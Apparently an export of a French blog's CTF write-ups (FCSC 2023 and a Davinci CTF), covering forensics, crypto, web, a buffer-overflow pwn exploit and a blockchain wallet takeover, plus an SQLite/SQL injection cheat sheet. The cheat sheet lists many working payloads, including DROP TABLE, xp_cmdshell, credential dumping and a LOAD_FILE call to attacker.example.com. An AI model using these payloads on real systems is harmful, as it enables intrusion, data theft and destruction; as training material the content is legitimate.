[{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: Vous devez afficher le flag, quelque soit le moyen utilisé !\nType: Reverse\nLevel: Intro ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Identification du problème:\nNous avons un fichier nomé aaarg, que nous devons décoder.\nInformations sur le fichiers Tout d’abord pour avoir plus d’informations sur le fichier,nous pouvons aller sur une VM Linux, aller dans un terminal et exécuter la commande: file aaarg Et c’est un éxécutable\nPrivilèges Pour nous donenr plus de privilèges sur le fichier,nous pouvons exécuter la commande: chmod +x aaarg.\nSolution Pour avoir le flag il ne faut pas aller chercher trop loin:juste à cat le fichier: Et le flag apparait !\nConclusion Parfois il ne faut pas aller chercher trop loin !\n","permalink":"https://artyeth06.github.io/aaarg/","summary":"Writeup du challenge aaarg issu du CTF FCSC 2023","title":"Aaarg"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: Il semblerait qu’un utilisateur exécute des scripts Powershell suspects sur sa machine. Heureusement cette machine est journalisée et nous avons pu récupérer le journal d’évènements Powershell. Retrouvez ce qui a été envoyé à l’attaquant.\nType: Forensics\nLevel: Intro ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nIdentification du problème Le fichier qui nous est donné est un log d’événements sur une machine windows:\nEn regardant ce log de plus près (5e) nous pouvons y voir pas mal de chose,intéressantes:\nBon ce que l’on comprends en gros c’est que une personne esasaie de se connecter à la machine,ouvre un shell et essaie de s’envoyer des données,les données envoyées sont celles de: 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D\nNous pouvons remarque que ce sont des données en Hexadécimal\nSolution Nous pouvons créer un script python permettant de reconstituer les données envoyées à l’attaquant:\nhex_list = [0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D]decoded_str = \u0026#39;\u0026#39;.join(chr(x ^ i) for i, x in enumerate(hex_list))print(decoded_str) Et nous obtenons le flag !\nConclusion Les logs window peuvent être très important ! Pourquoi envoyer un flag ?\n","permalink":"https://artyeth06.github.io/La_gazette_de_Windows/","summary":"Writeup du challenge La gazette de Windows issu du CTF FCSC 2023","title":"La gazette de Windows"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: Vous vous préparez à analyser une capture mémoire et vous notez quelques informations sur la machine avant de plonger dans l’analyse : - nom d’utilisateur, - nom de la machine, - navigateur utilisé. Le flag est au format FCSC{\u0026lt;nom d'utilisateur\u0026gt;:\u0026lt;nom de la machine\u0026gt;:\u0026lt;nom du navigateur\u0026gt;} où :\n\u0026lt;nom d'utilisateur\u0026gt; est le nom de l’utilisateur qui utilise la machine,\n\u0026lt;nom de la machine\u0026gt; est le nom de la machine analysée et\n\u0026lt;nom du navigateur\u0026gt; est le nom du navigateur en cours d’exécution. Par exemple : FCSC{toto:Ordinateur-de-jojo:Firefox}. Attention : pour cette épreuve, vous n’avez que 10 tentatives de flag.`\nType: forensics\nLevel: (Facile I guess ?) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ## Identification du problème:\nNous avons un dump mémoire que nous devons anlyser en y retrouvant 3 choses:\n\u0026lt;nom d'utilisateur\u0026gt; est le nom de l’utilisateur qui utilise la machine , - \u0026lt;nom de la machine\u0026gt; est le nom de la machine analysée\n\u0026lt;nom du navigateur\u0026gt; est le nom du navigateur en cours d’exécution. Pour analyser ce dump mémoire,nous pouvons utiliser Volatility3 qui est un outil permettant d’analyser les dumps mémoire\nSolution Il y a enormément de possibilités,il faut donc trouver une commande nous renseignant sur la session en cours,pour y voir les processus en cours,le nom d’utilisateur et celui de la machine,et pour cela,nous avons la commande: windows.sessions.Sessions permettant de lister les processus de session en cours\nEt en faisant la commande: python vol.py -f fcsc.dmp windows.sessions.Sessions Nous pouvons y voir les informations qui nous intéressent !\nNavigateur : Brave\nMachine: DESKTOP-PI234GP\nUtilisateur: Admin\n⚠️ Au début j’étais confus,mais les sessions administrateur de base ne sont pas Admin, mais Administrateur et en anglais: Administrator\nNous avons juste à format pour le flag !\n","permalink":"https://artyeth06.github.io/Ransom%C3%A9moire_0-3/","summary":"Writeup du challenge ransomémoire 0/3 issu du CTF FCSC 2023","title":"Ransomémoire 0-3"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: Un de vos collègues ne jure que par cette méthode de chiffrage révolutionnaire appelée rot13. Il l’a utilisée pour dissimuler un flag dans ce texte. Démontrez-lui qu’il a tort de supposer que cet algorithme apporte une quelconque notion de confidentialité !\nType: Crypto\nLevel: Intro ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ ## Identification du problème: Nous avons un texte encodé qui nous est donné:\nGBQB yvfgr : - Cnva (2 onthrggrf) - Ynvg (1 yvger) - Pbevnaqer (fhegbhg cnf, p\u0026#39;rfg cnf oba) - 4 onanarf, 4 cbzzrf, 4 benatrf - Cbhyrg (4 svyrgf qr cbhyrg) - 1 synt : SPFP{rq24p7sq86p2s0515366} - Câgrf (1xt) - Evm (fnp qr 18xt) - Abheve zba qvabfnher Comme le nom du chall nous l’indique: ROT13.\nSolution Un petit coup sur Cyberchef au Rot13 decoder et le tour est joué !\nConclusion Pouruqoi ne pas avoir utilisé le Rot14 ? x)\n","permalink":"https://artyeth06.github.io/rot13/","summary":"Writeup du challenge rot13 issu du CTF FCSC 2023","title":"ROT13"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: Vous avez très envie de rejoindre l’organisation du FCSC 2024 et vos skills d’OSINT vous ont permis de trouver ce site en construction. Prouvez à l’équipe organisatrice que vous êtes un crack en trouvant un flag ! https://tes-lent.france-cybersecurity-challenge.fr/\nType: Web\nLevel: Intro ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nIdentification du problème Nous arrivons sur cette page:\nEt nous devons d’après la description,trouver un flag. Les 3 pages qui sont à notre disposition sont:\nSolution En cherchant dans le code html de la page https://tes-lent.france-cybersecurity-challenge.fr/, nous y trouvons un commentaire redirigeant vers une page inconnue\nNous arrivons sur cette page\n] Qui à première vu ne contient riend’intéressant mais encore une fois,dans le code source de la page… Encore un développeur peu discret: [[Pasted image 20230430100711.png]]\nEt en nous rendant sur l’endpoint /admin-zithothiu8Yeng8iumeil5oFaeReezae.html,nous y trouvons le flag !\nConclusion Il ne faut pas se fier à ce que l’on peut voir,et attention aux développeurs de ne pas laisser des commentaires de admin panel accessible à tout le monde ;)\n","permalink":"https://artyeth06.github.io/t_es_lent/","summary":"Writeup du challenge T’es lent issu du CTF FCSC 2023","title":"T'es lent"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: Vous devez trier un tableau dont vous ne voyez pas les valeurs ! nc challenges.france-cybersecurity-challenge.fr 2051\nType: algorithmique\nLevel: Intro ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2 fichiers sont fournis avec le chall: - client.py permettant de se connecter en remote au serveur netcat - tri-selectif.py permettant de s’entrainer à trier le tableau\nIdentification du problème: Le problème est que l’on doit trier un tableau de 32 valeurs sans les connaitres ! 4 fonctions sont à notre disposition:\ncomparer X Y compare les valeurs du tableau aux cases X et Y, et retourne 1 si la valeur en X est inférieure ou égale à celle en Y, 0 sinon.\nechanger X Y échange les valeurs du tableau aux cases X et Y, et affiche le taleau modifié.\nlongueur retourne la longueur du tableau.\nverifier retourne le flag si le tableau est trié.\nSolution Afin de trier ce tableau,nous n’allons pas le faire à la main… Mais plutôt créer un script python nous permettant de faire ca de manière automatique:\ndef trier(N): for i in range(N-1): # Trouver l\u0026#39;index du plus petit élément non trié min_idx = i for j in range(i+1, N): #Comparer = \u0026lt; 0 signifie que X est \u0026gt; Y if comparer(j, min_idx) \u0026lt; 0: min_idx = j # Echanger les positions pour retrouver le bon ordre if min_idx != i: echanger(i, min_idx) Ce code va reprendre les fonctions précédentes afin de trier le tableau !\n","permalink":"https://artyeth06.github.io/tri_selectif/","summary":"Writeup du challenge Tri sélectif issu du CTF FCSC 2023","title":"Tri sélectif"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Description: On vous demande d’exploiter le binaire fourni pour lire le fichier flag.txt qui se trouve sur le serveur distant. nc challenges.france-cybersecurity-challenge.fr 2100\nType: pwn\nLevel: Intro ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ Identification du problème:\nInfo sur le fichiers Tout d’abord,nous pouvons exécuter la commande: file uid pour avoir + d’infos sur le fichier: C’est un exécutable,rien de très surprenant…\nReverse Ensuite,nous pouvons reverse le fichier grâce à ghidra:\nNous voyons que pour que le fichier flag.txt soit flag,il faut que le UID soit égal à 0. En se renseignant,j’apprends que le UID avec ses différentes valeurs nous indique les privilèges de l’utilisateur,ainsi un UID = 0 signifie que l’utilisateur est root (super Admin) sur la machine. nous pouvons essayer de lancer le fichier en local avec sudo pour être en tant que root:\nCa fonctionne !\nProblème Nous ne pouvons pas être root sur le serveur distant,donc il faut trouver un autre moyen…\nSolution Identification de la vuln D’après le code:\nundefined8 main(void){ undefined auStack_38 [44]; int iStack_c; iStack_c = geteuid(); printf(\u0026#34;username: \u0026#34;); fflush(stdout); __isoc99_scanf(\u0026amp;DAT_0010200f,auStack_38); if (iStack_c == 0) { system(\u0026#34;cat flag.txt\u0026#34;); } else { system(\u0026#34;cat flop.txt\u0026#34;); } return 0;} La variable iStack_c = geteuid(); ce qui veut dire que si iStack_c = 0 alors getuid = 0.\nSauf que la variable auStack_38 a un nombre de caractère à respecter (44) mais pas de nombre limité, et juste après c’est la variable iStack_c quiest définie,donc en faisant un buffer overflow nous pouvons écrire sur la variable iStack_c et donc avoir un UID = 0\nExploit de la vuln Nous povons créer un script python permet de créer le payload (qui devra finir par un null byte) afin d’exploiter la vuln:\nexploit = \u0026#34;A\u0026#34; * 44 + \u0026#34;\\x00\u0026#34;print(exploit) Puuis nous avons plus que à nous connecter au serveur distant en utilisant notre payload: python exploit.py| nc challenges.france-cybersecurity-challenge.fr 2100\nEt le flag apparait !\n","permalink":"https://artyeth06.github.io/uid/","summary":"Writeup du challenge uid issu du CTF FCSC 2023","title":"uid"},{"content":"Introduction Qu\u0026rsquo;est ce que le SQL ? Le SQL (Structured Query Language) est un langage informatique de gestion de bases de données. Il permet de manipuler et d\u0026rsquo;interroger des données stockées dans des tables et d\u0026rsquo;exécuter des opérations telles que la création, la mise à jour, la suppression et la recherche de données.\nComment est formé le backend ? Au plus classique (Et le plus vulnérable entre autre:):\n-- return SELECT (`password` = \u0026#39;$pass\u0026#39;) is_valid_password FROM users WHERE username = \u0026#39;admin\u0026#39; LIMIT 1; On peut se demander: mais comment c\u0026rsquo;est vulnérable ? En fait, la variable $pass, est remplacé par un input de user. Voici ce qu\u0026rsquo;il se passe quand on met la variable $pass avec la valeur Arty06.\n-- return SELECT (`password` = \u0026#39;Arty06\u0026#39;) is_valid_password FROM users WHERE username = \u0026#39;admin\u0026#39; LIMIT 1; Vulnérabilité La vulnérabilité est tel que nous pouvons facilement sortir de \u0026rsquo;l\u0026rsquo;input\u0026rsquo;: En y injectant: ' OR '1, nous avons:\n-- return SELECT (`password` = \u0026#39;\u0026#39; OR \u0026#39;1\u0026#39;) is_valid_password FROM users WHERE username = \u0026#39;admin\u0026#39; LIMIT 1; Nous bypassons donc le password,et le tour est joué !\nBypass/Payloads Voici des listes qui vont vous permettre de bypasser certainesrestrictions,ainsi que des payloads d\u0026rsquo;injection:\nCommentaires -- /**/ - Permet de mettre en commentaire tout ce qu\u0026rsquo;il le suit /**/ Permet de mettre en commentaire ce qui se trouve au mielieu SQlite version select sqlite_version(); BDD Structure UNION SELECT sql FROM sqlite_master UNION SELECT column_name FROM tab_name Pour pouvoir se \u0026ldquo;balader\u0026rdquo; dans la BDD Permet de voir comment sont ordonnés les tabs de la BDD. (A ne pas oublier d’adapter la payload à la situation…)\n\u0026ldquo;Injection Payload\u0026rdquo; \u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; OR 1=1 -- \u0026#39; OR 1=1; -- \u0026#39; OR 1=1# \u0026#39;; DROP TABLE users; -- \u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; -- \u0026#39; UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39;, \u0026#39;2\u0026#39; -- \u0026#39; AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- \u0026#39; AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=1,1,0))))))a) -- \u0026#39; AND (SELECT * FROM (SELECT(SLEEP(5-(IF(1=2,1,0))))))a) -- \u0026#39;;exec xp_cmdshell \u0026#39;cmd.exe\u0026#39; -- \u0026#39;;shutdown -- \u0026#39;;INSERT INTO users (username, password) VALUES (\u0026#39;hacker\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39;) -- \u0026#39;;UPDATE users SET password=\u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39; WHERE username=\u0026#39;admin\u0026#39; -- \u0026#39; AND (SELECT LOAD_FILE(\u0026#39;\\\\\\\\\\\\\\\\attacker.example.com\\\\\\\\file.txt\u0026#39;)) -- \u0026#39; AND (SELECT * FROM users WHERE username LIKE \u0026#39;A%\u0026#39;) -- \u0026#39; AND (SELECT * FROM users WHERE username LIKE \u0026#39;A%\u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39;) -- \u0026#39; AND (SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND password LIKE \u0026#39;81dc9bdb52d04dc20036dbd8313ed055%\u0026#39;) -- \u0026#39; AND (SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND password LIKE \u0026#39;81dc9bdb52d04dc20036dbd8313ed055%\u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39;) -- \u0026#39; AND (SELECT * FROM users WHERE username=\u0026#39;admin\u0026#39; AND password LIKE \u0026#39;81dc9bdb52d04dc20036dbd8313ed055%\u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055\u0026#39;, \u0026#39;2\u0026#39;) -- \u0026#39; AND 1=0 UNION ALL SELECT @@version -- \u0026#39; AND 1=0 UNION ALL SELECT @@datadir -- \u0026#39; AND 1=0 UNION ALL SELECT user() -- \u0026#39; AND 1=0 UNION ALL SELECT database() -- \u0026#39; AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables -- \u0026#39; AND 1=0 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39; -- \u0026#39; AND 1=0 UNION ALL SELECT concat(username,\u0026#39;:\u0026#39;,password) FROM users -- \u0026#39; AND 1=0 UNION ALL SELECT concat_ws(\u0026#39;:\u0026#39;,username,password) FROM users -- \u0026#39; AND 1=0 UNION ALL SELECT group_concat(username,\u0026#39;:\u0026#39;,password) FROM users -- \u0026#39; AND 1=0 UNION ALL SELECT group_concat(username,\u0026#39;:\u0026#39;,password SEPARATOR \u0026#39; | \u0026#39;) FROM users -- \u0026#39; AND 1=0 UNION ALL SELECT hex(group_concat(username,\u0026#39;:\u0026#39;,password SEPARATOR \u0026#39; | \u0026#39;)) FROM users -- \u0026#39; AND 1=0 UNION ALL SELECT unhex(hex(group_concat(username,\u0026#39;:\u0026#39;,password SEPARATOR \u0026#39; | \u0026#39;))) FROM users -- \u0026#39;-\u0026#39; \u0026#39; \u0026#39; \u0026#39;\u0026amp;\u0026#39; \u0026#39;^\u0026#39; \u0026#39;*\u0026#39; \u0026#39; or \u0026#39;\u0026#39;-\u0026#39; \u0026#39; or \u0026#39;\u0026#39; \u0026#39; \u0026#39; or \u0026#39;\u0026#39;\u0026amp;\u0026#39; \u0026#39; or \u0026#39;\u0026#39;^\u0026#39; \u0026#39; or \u0026#39;\u0026#39;*\u0026#39; \u0026#34;-\u0026#34; \u0026#34; \u0026#34; \u0026#34;\u0026amp;\u0026#34; \u0026#34;^\u0026#34; \u0026#34;*\u0026#34; \u0026#34; or \u0026#34;\u0026#34;-\u0026#34; \u0026#34; or \u0026#34;\u0026#34; \u0026#34; \u0026#34; or \u0026#34;\u0026#34;\u0026amp;\u0026#34; \u0026#34; or \u0026#34;\u0026#34;^\u0026#34; \u0026#34; or \u0026#34;\u0026#34;*\u0026#34; or true-- \u0026#34; or true-- \u0026#39; or true-- \u0026#34;) or true-- \u0026#39;) or true-- \u0026#39; or \u0026#39;x\u0026#39;=\u0026#39;x \u0026#39;) or (\u0026#39;x\u0026#39;)=(\u0026#39;x \u0026#39;)) or ((\u0026#39;x\u0026#39;))=((\u0026#39;x \u0026#34; or \u0026#34;x\u0026#34;=\u0026#34;x \u0026#34;) or (\u0026#34;x\u0026#34;)=(\u0026#34;x \u0026#34;)) or ((\u0026#34;x\u0026#34;))=((\u0026#34;x or 1=1 or 1=1-- or 1=1# admin\u0026#39; -- admin\u0026#39; # admin\u0026#39;/* admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- admin\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# admin\u0026#39;or 1=1 or \u0026#39;\u0026#39;=\u0026#39; admin\u0026#39; or 1=1 admin\u0026#39; or 1=1-- admin\u0026#39; or 1=1# admin\u0026#39; or 1=1/* admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1 admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- admin\u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1 admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- admin\u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# 1234 \u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;admin\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055 admin\u0026#34; -- admin\u0026#34; # admin\u0026#34;/* admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1 admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# admin\u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;/* admin\u0026#34;or 1=1 or \u0026#34;\u0026#34;=\u0026#34; admin\u0026#34; or 1=1 admin\u0026#34; or 1=1-- admin\u0026#34; or 1=1# admin\u0026#34; or 1=1/* admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1 admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# admin\u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;/* admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1 admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# admin\u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;/* 1234 \u0026#34; AND 1=0 UNION ALL SELECT \u0026#34;admin\u0026#34;, \u0026#34;81dc9bdb52d04dc20036dbd8313ed055 == = \u0026#39; \u0026#39; -- \u0026#39; # \u0026#39; – \u0026#39;-- \u0026#39;/* \u0026#39;# \u0026#34; -- \u0026#34; # \u0026#39; and 1=\u0026#39;1 \u0026#39; and a=\u0026#39;a or 1=1 or true \u0026#39; or \u0026#39;\u0026#39;=\u0026#39; \u0026#34; or \u0026#34;\u0026#34;=\u0026#34; 1′) and \u0026#39;1′=\u0026#39;1– \u0026#39; AND 1=0 UNION ALL SELECT \u0026#39;\u0026#39;, \u0026#39;81dc9bdb52d04dc20036dbd8313ed055 \u0026#34; AND 1=0 UNION ALL SELECT \u0026#34;\u0026#34;, \u0026#34;81dc9bdb52d04dc20036dbd8313ed055 and 1=1 and 1=1– \u0026#39; and \u0026#39;one\u0026#39;=\u0026#39;one \u0026#39; and \u0026#39;one\u0026#39;=\u0026#39;one– \u0026#39; group by password having 1=1-- \u0026#39; group by userid having 1=1-- \u0026#39; group by username having 1=1-- like \u0026#39;%\u0026#39; or 0=0 -- or 0=0 # or 0=0 – \u0026#39; or 0=0 # \u0026#39; or 0=0 -- \u0026#39; or 0=0 # \u0026#39; or 0=0 – \u0026#34; or 0=0 -- \u0026#34; or 0=0 # \u0026#34; or 0=0 – %\u0026#39; or \u0026#39;0\u0026#39;=\u0026#39;0 or 1=1 or 1=1-- or 1=1/* or 1=1# or 1=1– \u0026#39; or 1=1-- \u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- \u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# \u0026#39; or \u0026#39;1′=\u0026#39;1 \u0026#39; or 1=1 \u0026#39; or 1=1 -- \u0026#39; or 1=1 – \u0026#39; or 1=1-- \u0026#39; or 1=1;# \u0026#39; or 1=1/* \u0026#39; or 1=1# \u0026#39; or 1=1– \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1-- \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;/* \u0026#39;) or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# \u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1-- \u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;-- \u0026#39;) or (\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;# \u0026#39;or\u0026#39;1=1 \u0026#39;or\u0026#39;1=1′ \u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1 \u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- \u0026#34; or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# \u0026#34; or 1=1 \u0026#34; or 1=1 -- \u0026#34; or 1=1 – \u0026#34; or 1=1-- \u0026#34; or 1=1# \u0026#34; or 1=1– \u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1 \u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- \u0026#34;) or \u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# \u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1 \u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;-- \u0026#34;) or (\u0026#34;1\u0026#34;=\u0026#34;1\u0026#34;# ) or \u0026#39;1′=\u0026#39;1– ) or (\u0026#39;1′=\u0026#39;1– \u0026#39; or 1=1 LIMIT 1;# \u0026#39;or 1=1 or \u0026#39;\u0026#39;=\u0026#39; \u0026#34;or 1=1 or \u0026#34;\u0026#34;=\u0026#34; \u0026#39; or \u0026#39;a\u0026#39;=\u0026#39;a \u0026#39; or a=a-- \u0026#39; or a=a– \u0026#39;) or (\u0026#39;a\u0026#39;=\u0026#39;a \u0026#34; or \u0026#34;a\u0026#34;=\u0026#34;a \u0026#34;) or (\u0026#34;a\u0026#34;=\u0026#34;a \u0026#39;) or (\u0026#39;a\u0026#39;=\u0026#39;a and hi\u0026#34;) or (\u0026#34;a\u0026#34;=\u0026#34;a \u0026#39; or \u0026#39;one\u0026#39;=\u0026#39;one \u0026#39; or \u0026#39;one\u0026#39;=\u0026#39;one– \u0026#39; or uid like \u0026#39;% \u0026#39; or uname like \u0026#39;% \u0026#39; or userid like \u0026#39;% \u0026#39; or user like \u0026#39;% \u0026#39; or username like \u0026#39;% \u0026#39; or \u0026#39;x\u0026#39;=\u0026#39;x \u0026#39;) or (\u0026#39;x\u0026#39;=\u0026#39;x \u0026#34; or \u0026#34;x\u0026#34;=\u0026#34;x \u0026#39; OR \u0026#39;x\u0026#39;=\u0026#39;x\u0026#39;#; \u0026#39;=\u0026#39; \u0026#39;or\u0026#39; and \u0026#39;=\u0026#39; \u0026#39;or\u0026#39; \u0026#39; UNION ALL SELECT 1, @@version;# \u0026#39; UNION ALL SELECT system_user(),user();# \u0026#39; UNION select table_schema,table_name FROM information_Schema.tables;# admin\u0026#39; and substring(password/text(),1,1)=\u0026#39;7 \u0026#39; and substring(password/text(),1,1)=\u0026#39;7 \u0026#39; or 1=1 limit 1 -- -+ \u0026#39;=\u0026#34;or\u0026#39; Crédits YesWeHack Dojo pour les exemples``Paylaod all the things pour certains payloads``https://dojo-yeswehack.com/SQL-Injection/Training/Simple-Login-Bypass``https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md\n","permalink":"https://artyeth06.github.io/sql/","summary":"Une cheat cheat pour les vuls/injections Sqlite","title":"SQL"},{"content":"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nDescription: \u0026ldquo;No one can own my wallet !!!!\u0026rdquo; He said. Or can someone ? Try to steal his money.\nConnection info: http://web3.dvc.tf:5000/challenge1\nType: Blockchain ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNous devons,avant de commencer le chal,setup MM et tout\u0026hellip; Une fois setup,nous devons deployer le contrat:\nPour pouvoir interagir avec le contrat,nous pouvons utiliser Remix-IDE, avec l\u0026rsquo;adresse du contrat,et le code:\nPuis nous devons,importer le contraten appuyant sur At Adress (au préalable compiler le .sol):\nEn analysant le programme,la SEUL personne pouvant transférer le ownership,doit être la personne,ayant pour adresse,celle stockée dans la variable me,qui,est déclarée ici:\nfunction initWallet() public { me = msg.sender; } msg.sender =\u0026gt; Personne qui exécute l\u0026rsquo;action/fonction ,ainsi en déployant le contrat,notre adresse est celle de me Nous devons donc exécuter la fonction initWallet,puis\nNous pouvons ainsi exécuter la fonction migrateTo,qui prends en paramètre l\u0026rsquo;adresse à qui est transférée la TOTALITE de l\u0026rsquo;argent stockée dans le contrat:\nfunction migrateTo(address to) public { require(msg.sender == me, \u0026#34;Only me can withdraw all the funds\u0026#34;); payable(to).transfer(address(this).balance); } Nous avons juste à exécuter cette fonction en mettant en paramètre une autre adresse,comme: 0xC1245227D6581DaB6f7bD5310B0fBec2e179b9eF:\nEt,en retournant sur le site,nous devons vérifier le contrat,et le flag apparait !\n","permalink":"https://artyeth06.github.io/owner_pwned/","summary":"Writeup du challenge Owner Pwned issu du CTF Davinci CTF (présentiel)","title":"Owner 